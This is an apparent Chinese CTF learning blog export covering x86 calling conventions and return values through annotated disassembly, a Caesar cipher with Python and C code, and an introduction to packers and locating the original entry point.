<h1 id="利用寄存器传递参数-fastcall"><a href="#利用寄存器传递参数-fastcall" class="headerlink" title="利用寄存器传递参数-fastcall"></a>利用寄存器传递参数-fastcall</h1><img src="/2022/12/29/%E4%BB%8E%E6%B1%87%E7%BC%96%E8%A7%92%E5%BA%A6%E7%9C%8B%E7%A8%8B%E5%BA%8F/image-20221231111720506.png" class title="This is an image">

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">00401000            | 55           | push ebp                |</span><br><span class="line">00401001            | 8BEC         | mov ebp,esp             |</span><br><span class="line">00401003            | 6A 04        | push 4                  | 堆栈传参</span><br><span class="line">00401005            | 6A 03        | push 3                  | 堆栈传参</span><br><span class="line">00401007            | BA 02000000  | mov edx,2               | 寄存器传参</span><br><span class="line">0040100C            | B1 01        | mov cl,1                | 8位寄存器传参</span><br><span class="line">0040100E            | E8 04000000  | call fastcall.401017    |</span><br></pre></td></tr></table></figure>

<p>跟进函数401017 </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">00401017            | 55            | push ebp                                 |</span><br><span class="line">00401018            | 8BEC          | mov ebp,esp                              |</span><br><span class="line">0040101A            | 83EC 08       | sub esp,8                                |</span><br><span class="line">0040101D            | 8955 F8       | mov dword ptr ss:[ebp-8],edx             |把edx存到ebp-8的局部变量里</span><br><span class="line">00401020            | 884D FC       | mov byte ptr ss:[ebp-4],cl               |把cl存到ebp-4的局部变量里</span><br><span class="line">00401023            | 0FBE45 FC     | movsx eax,byte ptr ss:[ebp-4]            |8位扩展到双字（将字符型整数符号扩展为一个双字）</span><br><span class="line">00401027            | 0345 F8       | add eax,dword ptr ss:[ebp-8]             | 1+2</span><br><span class="line">0040102A            | 0345 08       | add eax,dword ptr ss:[ebp+8]             | +3</span><br><span class="line">0040102D            | 0345 0C       | add eax,dword ptr ss:[ebp+C]             | +4 </span><br><span class="line">00401030            | 8BE5          | mov esp,ebp                              |</span><br><span class="line">00401032            | 5D            | pop ebp                                  |</span><br><span class="line">00401033            | C2 0800       | ret 8                                    |</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//源码</span></span><br><span class="line"><span class="type">int</span>  __fastcall <span class="title function_">Add</span><span class="params">(<span class="type">char</span>,<span class="type">long</span>,<span class="type">int</span>,<span class="type">int</span>)</span>;</span><br><span class="line"></span><br><span class="line">main(<span class="type">void</span>)</span><br><span class="line"> &#123;</span><br><span class="line">	    Add(<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>);</span><br><span class="line">	    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> __fastcall <span class="title function_">Add</span><span class="params">(<span class="type">char</span> a, <span class="type">long</span> b, <span class="type">int</span> c, <span class="type">int</span> d)</span></span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">	   <span class="keyword">return</span> (a + b + c + d);</span><br></pre></td></tr></table></figure>

<h1 id="利用寄存器传递参数-this指针"><a href="#利用寄存器传递参数-this指针" class="headerlink" title="利用寄存器传递参数-this指针"></a>利用寄存器传递参数-this指针</h1><img src="/2022/12/29/%E4%BB%8E%E6%B1%87%E7%BC%96%E8%A7%92%E5%BA%A6%E7%9C%8B%E7%A8%8B%E5%BA%8F/image-20221231113936099.png" class title="This is an image">

<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//源码</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CSum</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">public:</span><br><span class="line">	<span class="type">int</span> <span class="title function_">Add</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b)</span> <span class="comment">//实际Add原型具有如下形式:Add(this,int a,int b)</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">return</span> (a + b);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;     </span><br><span class="line">	CSum sum;</span><br><span class="line">	sum.Add(<span class="number">1</span>, <span class="number">2</span>);</span><br><span class="line">&#125; </span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">00401000            | 55              | push ebp                               |</span><br><span class="line">00401001            | 8BEC            | mov ebp,esp                            |</span><br><span class="line">00401003            | 51              | push ecx                               |</span><br><span class="line">00401004            | 6A 02           | push 2                                 | 第3个参数</span><br><span class="line">00401006            | 6A 01           | push 1                                 | 第2个参数</span><br><span class="line">00401008            | 8D4D FC         | lea ecx,dword ptr ss:[ebp-4]           | this指针（寄存器传参）</span><br><span class="line">0040100B            | E8 10000000     | call vf.401020                         | add()</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">00401020            | 55              | push ebp                                 |</span><br><span class="line">00401021            | 8BEC            | mov ebp,esp                              |</span><br><span class="line">00401023            | 51              | push ecx                                 |</span><br><span class="line">00401024            | 894D FC         | mov dword ptr ss:[ebp-4],ecx             | this指针通过ecx寄存器传递</span><br><span class="line">00401027            | 8B45 08         | mov eax,dword ptr ss:[ebp+8]             |</span><br><span class="line">0040102A            | 0345 0C         | add eax,dword ptr ss:[ebp+C]             | </span><br><span class="line">0040102D            | 8BE5            | mov esp,ebp                              |</span><br><span class="line">0040102F            | 5D              | pop ebp                                  |</span><br><span class="line">00401030            | C2 0800         | ret 8                                    |</span><br></pre></td></tr></table></figure>

<h1 id="函数的返回值"><a href="#函数的返回值" class="headerlink" title="函数的返回值"></a>函数的返回值</h1><h2 id="用return操作符返回值"><a href="#用return操作符返回值" class="headerlink" title="用return操作符返回值"></a>用return操作符返回值</h2><p>一般情况下，函数的返回值放在eax寄存器中返回，如果处理结果的大小超过eax寄存器的容量，其高32位就会放到edx寄存器里</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//源码</span></span><br><span class="line">Myadd(<span class="type">int</span> x,<span class="type">int</span> y)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> temp;</span><br><span class="line">    temp=x+y;</span><br><span class="line">    <span class="keyword">return</span> temp;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">汇编实现代码</span><br><span class="line">主程序：</span><br><span class="line">push x; 压入第二个参数ebp+c</span><br><span class="line">push y; 压入第一个参数ebp+8</span><br><span class="line">call Myadd;</span><br><span class="line">..</span><br><span class="line">mov ..,eax;</span><br><span class="line"></span><br><span class="line">Myadd函数:</span><br><span class="line">push ebp;</span><br><span class="line">mov ebp,esp;</span><br><span class="line">sub esp,4;</span><br><span class="line">mov ebx,[ebp+0C];取第一个参数</span><br><span class="line">mov ecx,[ebp+8];取第二个参数</span><br><span class="line">add ebx,ecx;</span><br><span class="line">mov [ebp-4],ebx;结果放到局部变量里</span><br><span class="line">mov eax,[ebp-4];将局部变量返回eax</span><br><span class="line">mov esp,ebp;</span><br><span class="line">add esp,4;</span><br><span class="line">ret;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="通过参数按传引用方式返回值"><a href="#通过参数按传引用方式返回值" class="headerlink" title="通过参数按传引用方式返回值"></a>通过参数按传引用方式返回值</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//源码</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">max</span><span class="params">(<span class="type">int</span> *a, <span class="type">int</span> *b)</span>;</span><br><span class="line">main( )</span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">int</span> a=<span class="number">5</span>,b=<span class="number">6</span>;</span><br><span class="line">	max(&amp;a, &amp;b); </span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;a、b中较大的数是%d&quot;</span>,a); <span class="comment">//将最大的数显示出来</span></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">max</span><span class="params">( <span class="type">int</span> *a, <span class="type">int</span> *b)</span> </span><br><span class="line">&#123; </span><br><span class="line">	<span class="keyword">if</span>(*a &lt; *b)</span><br><span class="line">		*a=*b; 		<span class="comment">//经比较后，将较大的数放到a变量之中</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">00401000                 | 83EC 08                                 | sub esp,8                                | 设此时esp=k 为局部变量分配内存</span><br><span class="line">00401003                 | 8D4424 04                               | lea eax,dword ptr ss:[esp+4]             | eax指向变量，值为k-4h（第二个指针把地址放到eax）</span><br><span class="line">00401007                 | 8D4C24 00                               | lea ecx,dword ptr ss:[esp]               | 第一个指针把地址放到ecx，值为k-8h</span><br><span class="line">0040100B                 | 50                                      | push eax                                 | 指向参数b的字符指针入栈 ebp+8</span><br><span class="line">0040100C                 | 51                                      | push ecx                                 | 指向参数a的字符指针入栈 ebp+4</span><br><span class="line">0040100D                 | C74424 08 05000000                      | mov dword ptr ss:[esp+8],5               | 将参数a放入  *指针1=5</span><br><span class="line">00401015                 | C74424 0C 06000000                      | mov dword ptr ss:[esp+C],6               | 将参数b放入  *指针2=6</span><br><span class="line">0040101D                 | E8 1E000000                             | call return.401040                       |</span><br><span class="line">00401022                 | 8B5424 08                               | mov edx,dword ptr ss:[esp+8]             | esp+8=a edx=a</span><br><span class="line">00401026                 | 52                                      | push edx                                 | a的值压入栈中</span><br><span class="line">00401027                 | 68 30704000                             | push return.407030                       | 格式化字符串</span><br><span class="line">0040102C                 | E8 2F000000                             | call return.401060                       | printf</span><br><span class="line">00401031                 | 33C0                                    | xor eax,eax                              |</span><br><span class="line">00401033                 | 83C4 18                                 | add esp,18                               |</span><br><span class="line">00401036                 | C3                                      | ret                                      |</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">00401040                 | 8B4424 08                               | mov eax,dword ptr ss:[esp+8]             | eax就是指向参数b的指针   </span><br><span class="line">00401044                 | 8B4C24 04                               | mov ecx,dword ptr ss:[esp+4]             | ecx就是指向参数a的指针</span><br><span class="line">00401048                 | 8B00                                    | mov eax,dword ptr ds:[eax]               | 将参数b的值加载到寄存器eax  eax=地址 [eax]=值 eax=6</span><br><span class="line">0040104A                 | 8B11                                    | mov edx,dword ptr ds:[ecx]               | 将参数a的值加载到寄存器edx</span><br><span class="line">0040104C                 | 3BD0                                    | cmp edx,eax                              | 比较</span><br><span class="line">0040104E                 | 7D 02                                   | jge return.401052                        | 若a&lt;b，不跳转</span><br><span class="line">00401050                 | 8901                                    | mov dword ptr ds:[ecx],eax               | 将较大的值放在参数a所指数据区</span><br><span class="line">00401052                 | C3                                      | ret                                      |</span><br></pre></td></tr></table></figure>



<p>以上过程还是自己多动手调调比较好，光看文字是无法理解的，作为一个刚入门的小白，re的挨打之路才刚刚开始</p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>re</tag>
      </tags>
  </entry>
  <entry>
    <title>凯撒密码</title>
    <url>/2023/01/04/%E5%87%AF%E6%92%92%E5%AF%86%E7%A0%81/</url>
    <content><![CDATA[<h1 id="凯撒密码"><a href="#凯撒密码" class="headerlink" title="凯撒密码"></a>凯撒密码</h1><p><strong>凯撒密码</strong>（英语：Caesar cipher），或称<strong>凯撒加密</strong>、<strong>凯撒变换</strong>、<strong>变换加密</strong>，是一种最简单且最广为人知的加密技术。凯撒密码是一种<a href="https://zh.wikipedia.org/wiki/%E6%9B%BF%E6%8D%A2%E5%BC%8F%E5%AF%86%E7%A0%81">替换加密</a>技术，<a href="https://zh.wikipedia.org/wiki/%E6%98%8E%E6%96%87">明文</a>中的所有字母都在<a href="https://zh.wikipedia.org/wiki/%E5%AD%97%E6%AF%8D%E8%A1%A8">字母表</a>上向后（或向前）按照一个固定数目进行偏移后被替换成<a href="https://zh.wikipedia.org/wiki/%E5%AF%86%E6%96%87">密文</a>。例如，当偏移量是3的时候，所有的字母A将被替换成D，B变成E，以此类推。这个加密方法是以<a href="https://zh.wikipedia.org/wiki/%E7%BE%85%E9%A6%AC%E5%85%B1%E5%92%8C">罗马共和</a>时期<a href="https://zh.wikipedia.org/wiki/%E5%87%B1%E6%92%92">凯撒</a>的名字命名的，据称当年凯撒曾用此方法与其将军们进行联系。</p>
<h4 id="公式："><a href="#公式：" class="headerlink" title="公式："></a>公式：</h4><p>凯撒密码的加密、解密方法还能够通过<a href="https://zh.wikipedia.org/wiki/%E5%90%8C%E4%BD%99">同余</a>的数学方法进行计算。首先将字母用数字代替，A&#x3D;0，B&#x3D;1，…，Z&#x3D;25。此时偏移量为N的加密方法即为：</p>
<p>加密公式： f(a)&#x3D;(a+N) mod 26</p>
<p>解密公式： f(a)&#x3D;(a+(26-N)) mod 26</p>
<h4 id="代码实现"><a href="#代码实现" class="headerlink" title="代码实现"></a>代码实现</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 凯撒密码</span></span><br><span class="line">ptxt = <span class="built_in">input</span>(<span class="string">&quot;请输入加密文本：&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> p <span class="keyword">in</span> ptxt:</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;a&#x27;</span> &lt;= p &lt;= <span class="string">&#x27;z&#x27;</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">chr</span>(<span class="built_in">ord</span>(<span class="string">&#x27;a&#x27;</span>) + (<span class="built_in">ord</span>(p) - <span class="built_in">ord</span>(<span class="string">&#x27;a&#x27;</span>) + <span class="number">3</span>) % <span class="number">26</span>), end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    <span class="keyword">elif</span> <span class="string">&#x27;A&#x27;</span> &lt;= p &lt;= <span class="string">&#x27;Z&#x27;</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">chr</span>(<span class="built_in">ord</span>(<span class="string">&#x27;A&#x27;</span>) + (<span class="built_in">ord</span>(p) - <span class="built_in">ord</span>(<span class="string">&#x27;A&#x27;</span>) + <span class="number">3</span>) % <span class="number">26</span>), end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(p, end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 解密</span></span><br><span class="line"><span class="built_in">print</span>()</span><br><span class="line">password = <span class="built_in">input</span>(<span class="string">&quot;请输入密文：&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> p <span class="keyword">in</span> password:</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;a&#x27;</span> &lt;= p &lt;= <span class="string">&#x27;z&#x27;</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">chr</span>(<span class="built_in">ord</span>(<span class="string">&#x27;a&#x27;</span>) + (<span class="built_in">ord</span>(p) - <span class="built_in">ord</span>(<span class="string">&#x27;a&#x27;</span>) - <span class="number">3</span>) % <span class="number">26</span>), end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    <span class="keyword">elif</span> <span class="string">&#x27;A&#x27;</span> &lt;= p &lt;= <span class="string">&#x27;Z&#x27;</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">chr</span>(<span class="built_in">ord</span>(<span class="string">&#x27;A&#x27;</span>) + (<span class="built_in">ord</span>(p) - <span class="built_in">ord</span>(<span class="string">&#x27;A&#x27;</span>) - <span class="number">3</span>) % <span class="number">26</span>), end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(p, end=<span class="string">&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="comment">//加密</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">kaisa_encrypt</span><span class="params">(<span class="type">char</span> *text,<span class="type">char</span> *result,<span class="type">int</span> k)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span> small_letter[<span class="number">26</span>]=&#123;<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;b&#x27;</span>,<span class="string">&#x27;c&#x27;</span>,<span class="string">&#x27;d&#x27;</span>,<span class="string">&#x27;e&#x27;</span>,<span class="string">&#x27;f&#x27;</span>,<span class="string">&#x27;g&#x27;</span>,<span class="string">&#x27;h&#x27;</span>,<span class="string">&#x27;i&#x27;</span>,<span class="string">&#x27;j&#x27;</span>,<span class="string">&#x27;k&#x27;</span>,<span class="string">&#x27;l&#x27;</span>,<span class="string">&#x27;m&#x27;</span>,<span class="string">&#x27;n&#x27;</span>,<span class="string">&#x27;o&#x27;</span>,<span class="string">&#x27;p&#x27;</span>,<span class="string">&#x27;q&#x27;</span>,<span class="string">&#x27;r&#x27;</span>,<span class="string">&#x27;s&#x27;</span>,<span class="string">&#x27;t&#x27;</span>,<span class="string">&#x27;u&#x27;</span>,<span class="string">&#x27;v&#x27;</span>,<span class="string">&#x27;w&#x27;</span>,<span class="string">&#x27;x&#x27;</span>,<span class="string">&#x27;y&#x27;</span>,<span class="string">&#x27;z&#x27;</span>&#125;;</span><br><span class="line">    <span class="type">char</span> big_letter[<span class="number">26</span>]=&#123;<span class="string">&#x27;A&#x27;</span>,<span class="string">&#x27;B&#x27;</span>,<span class="string">&#x27;C&#x27;</span>,<span class="string">&#x27;D&#x27;</span>,<span class="string">&#x27;E&#x27;</span>,<span class="string">&#x27;F&#x27;</span>,<span class="string">&#x27;G&#x27;</span>,<span class="string">&#x27;H&#x27;</span>,<span class="string">&#x27;I&#x27;</span>,<span class="string">&#x27;J&#x27;</span>,<span class="string">&#x27;K&#x27;</span>,<span class="string">&#x27;L&#x27;</span>,<span class="string">&#x27;M&#x27;</span>,<span class="string">&#x27;N&#x27;</span>,<span class="string">&#x27;O&#x27;</span>,<span class="string">&#x27;P&#x27;</span>,<span class="string">&#x27;Q&#x27;</span>,<span class="string">&#x27;R&#x27;</span>,<span class="string">&#x27;S&#x27;</span>,<span class="string">&#x27;T&#x27;</span>,<span class="string">&#x27;U&#x27;</span>,<span class="string">&#x27;V&#x27;</span>,<span class="string">&#x27;W&#x27;</span>,<span class="string">&#x27;X&#x27;</span>,<span class="string">&#x27;Y&#x27;</span>,<span class="string">&#x27;Z&#x27;</span>&#125;;</span><br><span class="line">    <span class="comment">//判断是否符合</span></span><br><span class="line">    <span class="keyword">if</span>(text == <span class="literal">NULL</span> || k &lt;= <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">int</span> m = <span class="built_in">strlen</span>(text); <span class="comment">//获取明文的长度</span></span><br><span class="line">    <span class="keyword">if</span>(m &lt;= <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;m;i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (text[i] &gt;= <span class="string">&#x27;A&#x27;</span> &amp;&amp; text[i] &lt;= <span class="string">&#x27;Z&#x27;</span>) &#123;</span><br><span class="line">            result[i] = big_letter[((text[i] - <span class="string">&#x27;A&#x27;</span>) + k) % <span class="number">26</span>];</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (text[i] &gt;= <span class="string">&#x27;a&#x27;</span> &amp;&amp; text[i] &lt;= <span class="string">&#x27;z&#x27;</span>) &#123;</span><br><span class="line">            result[i] = small_letter[((text[i] - <span class="string">&#x27;a&#x27;</span>) + k) % <span class="number">26</span>];</span><br><span class="line">        &#125; <span class="keyword">else</span> result[i] = text[i];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//解密</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">kaisa_decrypt</span><span class="params">(<span class="type">char</span> *text,<span class="type">char</span> *result,<span class="type">int</span> k)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> p;</span><br><span class="line">    <span class="type">char</span> small_letter[<span class="number">26</span>]=&#123;<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;b&#x27;</span>,<span class="string">&#x27;c&#x27;</span>,<span class="string">&#x27;d&#x27;</span>,<span class="string">&#x27;e&#x27;</span>,<span class="string">&#x27;f&#x27;</span>,<span class="string">&#x27;g&#x27;</span>,<span class="string">&#x27;h&#x27;</span>,<span class="string">&#x27;i&#x27;</span>,<span class="string">&#x27;j&#x27;</span>,<span class="string">&#x27;k&#x27;</span>,<span class="string">&#x27;l&#x27;</span>,<span class="string">&#x27;m&#x27;</span>,<span class="string">&#x27;n&#x27;</span>,<span class="string">&#x27;o&#x27;</span>,<span class="string">&#x27;p&#x27;</span>,<span class="string">&#x27;q&#x27;</span>,<span class="string">&#x27;r&#x27;</span>,<span class="string">&#x27;s&#x27;</span>,<span class="string">&#x27;t&#x27;</span>,<span class="string">&#x27;u&#x27;</span>,<span class="string">&#x27;v&#x27;</span>,<span class="string">&#x27;w&#x27;</span>,<span class="string">&#x27;x&#x27;</span>,<span class="string">&#x27;y&#x27;</span>,<span class="string">&#x27;z&#x27;</span>&#125;;</span><br><span class="line">    <span class="type">char</span> big_letter[<span class="number">26</span>]=&#123;<span class="string">&#x27;A&#x27;</span>,<span class="string">&#x27;B&#x27;</span>,<span class="string">&#x27;C&#x27;</span>,<span class="string">&#x27;D&#x27;</span>,<span class="string">&#x27;E&#x27;</span>,<span class="string">&#x27;F&#x27;</span>,<span class="string">&#x27;G&#x27;</span>,<span class="string">&#x27;H&#x27;</span>,<span class="string">&#x27;I&#x27;</span>,<span class="string">&#x27;J&#x27;</span>,<span class="string">&#x27;K&#x27;</span>,<span class="string">&#x27;L&#x27;</span>,<span class="string">&#x27;M&#x27;</span>,<span class="string">&#x27;N&#x27;</span>,<span class="string">&#x27;O&#x27;</span>,<span class="string">&#x27;P&#x27;</span>,<span class="string">&#x27;Q&#x27;</span>,<span class="string">&#x27;R&#x27;</span>,<span class="string">&#x27;S&#x27;</span>,<span class="string">&#x27;T&#x27;</span>,<span class="string">&#x27;U&#x27;</span>,<span class="string">&#x27;V&#x27;</span>,<span class="string">&#x27;W&#x27;</span>,<span class="string">&#x27;X&#x27;</span>,<span class="string">&#x27;Y&#x27;</span>,<span class="string">&#x27;Z&#x27;</span>&#125;;</span><br><span class="line">    <span class="keyword">if</span>(text == <span class="literal">NULL</span> || k &lt;= <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">int</span> m = <span class="built_in">strlen</span>(text);</span><br><span class="line">    <span class="keyword">if</span>(m &lt;= <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;m;i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (text[i] &gt;= <span class="string">&#x27;A&#x27;</span> &amp;&amp; text[i] &lt;= <span class="string">&#x27;Z&#x27;</span>) &#123;</span><br><span class="line">            p = ((text[i] - <span class="string">&#x27;A&#x27;</span>) - k);</span><br><span class="line">            <span class="keyword">while</span> (p &lt; <span class="number">0</span>)p += <span class="number">26</span>;</span><br><span class="line">            result[i] = big_letter[p];</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (text[i] &gt;= <span class="string">&#x27;a&#x27;</span> &amp;&amp; text[i] &lt;= <span class="string">&#x27;z&#x27;</span>) &#123;</span><br><span class="line">            p = ((text[i] - <span class="string">&#x27;a&#x27;</span>) - k);</span><br><span class="line">            <span class="keyword">while</span> (p &lt; <span class="number">0</span>)p += <span class="number">26</span>;</span><br><span class="line">            result[i] = small_letter[p];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> result[i] = text[i];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span> text[<span class="number">50</span>]=<span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="type">char</span> result[<span class="number">50</span>]=<span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="type">int</span> k;</span><br><span class="line">    <span class="type">int</span> type;</span><br><span class="line">    <span class="comment">/**欢迎**/</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;--------欢迎使用凯撒密码-----------\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;请填写明文或者密文\n&quot;</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%[^\n]&quot;</span>,text);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;请选择加密方式，输入1加密，输入2解密\n&quot;</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;type);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;请输入密钥k\n&quot;</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;k);</span><br><span class="line">    <span class="keyword">if</span>(type == <span class="number">1</span>)&#123;</span><br><span class="line">        <span class="comment">/***加密****/</span></span><br><span class="line">        kaisa_encrypt(text,result,k);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;明文%s的密文为:%s\n&quot;</span>,text,result);</span><br><span class="line">    &#125;<span class="keyword">else</span> <span class="keyword">if</span>(type == <span class="number">2</span>)&#123;</span><br><span class="line">        <span class="comment">/***解密****/</span></span><br><span class="line">        kaisa_decrypt(text,result,k);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;密文%s的明文为:%s\n&quot;</span>,text,result);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>加密算法</tag>
      </tags>
  </entry>
  <entry>
    <title>初识壳、RC4加密算法以及DASCTF三月春季挑战赛easyre的复现</title>
    <url>/2022/12/30/%E5%88%9D%E8%AF%86%E5%A3%B3%E4%BB%A5%E5%8F%8ADASCTF%E4%B8%89%E6%9C%88%E6%98%A5%E5%AD%A3%E6%8C%91%E6%88%98%E8%B5%9Beasyre%E7%9A%84%E5%A4%8D%E7%8E%B0/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><h2 id="壳的加载过程"><a href="#壳的加载过程" class="headerlink" title="壳的加载过程"></a>壳的加载过程</h2><p>壳修改了原程序执行文件的组织结构，从而能够比原程序代码早获得控制权，而且不会影响原程序的正常进行。</p>
<p>1.保存入口参数</p>
<p>加壳程序在初始化时会保存各寄存器的值，待外壳执行完毕，再恢复各寄存器的内容，最后跳到原程序执行。通常用pushad&#x2F;popad、pushfd&#x2F;popfd指令对来保存与恢复现场环境</p>
<p>2.获取壳本身需要使用的API地址</p>
<p>3.解密原程序各个区块的数据</p>
<p>出于保护原程序代码和数据的目的，壳一般会加密原程序文件的各个区块。在程序执行时，外壳将解密这些区块数据，从而使程序能够正常运行。</p>
<p>4.IAT的初始化</p>
<p>5.重定位项的处理</p>
<p>6.Hook API</p>
<p>7.跳转到程序入口点（OEP）</p>
<p>这个时候起，壳就将控制权还给原程序了。</p>
<h1 id="根据栈平衡原理寻找OEP"><a href="#根据栈平衡原理寻找OEP" class="headerlink" title="根据栈平衡原理寻找OEP"></a>根据栈平衡原理寻找OEP</h1><p>在编写加壳软件时，必须保证外壳初始化的现场环境（即各寄存器值）与原程序的现场环境是相同的。加壳程序在初始化时保存各寄存器的值，待外壳执行完毕恢复各寄存器的内容，最后跳转到原程序执行。</p>
<p><strong>1.如果要返回父程序，则当我们在堆栈中进行堆栈操作的时候，一定要保证在RET这条指令之前，ESP指向的是我们压入栈中的地址</strong></p>
<p>2.如果通过堆栈传递参数了，那么在函数执行完毕后，要平衡参数导致的堆栈变化所以由于在程序自解密或者自解压过程中，不少壳会先将当前寄存器内容压栈，如使用pushad，在解压结束后，会将之前的寄存器值出栈，如使用popad。因此在寄存器出栈时，往往程序代码被自动恢复，此时硬件断点触发。然后在程序当前位置，只需要少许单步跟踪，就很容易到达正确的OEP位置。</p>
